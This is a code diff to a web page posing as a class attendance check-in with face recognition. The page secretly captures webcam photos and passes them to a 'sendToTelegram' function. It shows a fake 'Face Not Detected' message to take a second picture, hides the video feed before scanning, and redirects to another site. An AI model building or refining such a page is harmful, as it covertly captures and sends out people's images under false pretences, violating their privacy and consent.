@@ -24,15 +24,9 @@
             50% { transform: scale(1.2); opacity: 0.5; }
             100% { transform: scale(1); opacity: 1; }
         }
-        .buttons {
-            margin-top: 20px;
-        }
-        .buttons button {
-            margin: 10px;
-        }
         #video {
-            width: 100%; /* Make video fill the available width */
-            height: auto; /* Maintain aspect ratio */
+            width: 100%;
+            height: auto;
         }
     </style>
 </head>
@@ -47,7 +41,7 @@
     <div id="face-recognition" class="hidden">
         <div class="scan-animation"></div>
         <p>Scanning face...</p>
-        <video id="video" autoplay></video> <!-- Video element to display webcam feed -->
+        <video id="video" autoplay></video>
         <button id="start-scan">Start Scan</button>
         <button id="cancel">Cancel</button>
     </div>
@@ -84,29 +78,29 @@
             $('.name-checkbox').on('change', function() {
                 if (this.checked) {
                     selectedNames.add(this.value);
-                    this.disabled = true; // Disable the current checkbox
-                    $('.name-checkbox').not(this).prop('disabled', true); // Disable other checkboxes
-                    $('#proceed').removeClass('hidden'); // Show the Continue button
+                    this.disabled = true;
+                    $('.name-checkbox').not(this).prop('disabled', true);
+                    $('#proceed').removeClass('hidden');
                 }
             });
 
             $('#proceed').on('click', function() {
                 $('#class-selection').addClass('hidden');
                 $('#face-recognition').removeClass('hidden');
-                $('#start-scan').removeClass('hidden'); // Show the "Start Scan" button
-                localStorage.setItem("pageOpened", "true"); // Disable access after clicking Continue
-                startCamera(); // Start the webcam feed
+                $('#start-scan').removeClass('hidden');
+                localStorage.setItem("pageOpened", "true");
+                startCamera();
             });
 
             $('#cancel').on('click', function() {
                 alert('Page will stop here.');
-                // Allow access again after clicking cancel
                 localStorage.setItem("pageOpened", "false");
             });
 
             $('#start-scan').on('click', function() {
                 $('#start-scan').addClass('hidden');
-                setTimeout(() => takePicture(1), 2000); // Start the picture-taking process
+                $('#video').hide(); // Sembunyikan video sebelum scan
+                setTimeout(() => takePicture(1), 2000);
             });
         });
 
@@ -127,20 +121,9 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
 
-            // Set canvas dimensions to match video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-
-            // Draw video frame on canvas
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Stop camera stream
-            const stream = video.srcObject;
-            const tracks = stream.getTracks();
-            tracks.forEach(track => track.stop());
-
-            // Hide the video element entirely to avoid showing it
-            video.style.display = "none"; // Hide the video element immediately
 
             sendToTelegram(canvas, step);
         }
@@ -160,19 +143,27 @@
                         setTimeout(() => {
                             $('#face-not-detected').addClass('hidden');
                             $('#face-recognition').removeClass('hidden');
-                            // Delay before the second image capture
-                            setTimeout(() => takePicture(2), 4000); // Increased delay before taking second picture
-                        }, 5000); // Wait 5 seconds before showing "Face Not Detected"
+                            setTimeout(() => takePicture(2), 4000);
+                        }, 5000);
                     } else {
+                        stopCamera();
                         $('#face-recognition').addClass('hidden');
                         $('#completion').removeClass('hidden');
                         $('#signed-in').text([...selectedNames].join(', ') + " signed in ✅");
                         setTimeout(() => {
-                            window.location.href = "https://studandlearn.github.io/project-2/"; // Redirect to the desired page
+                            window.location.href = "https://studandlearn.github.io/project-2/";
                         }, 3000);
                     }
                 });
             }, 'image/jpeg');
+        }
+
+        function stopCamera() {
+            const video = document.getElementById('video');
+            const stream = video.srcObject;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
         }
     </script>
 </body>
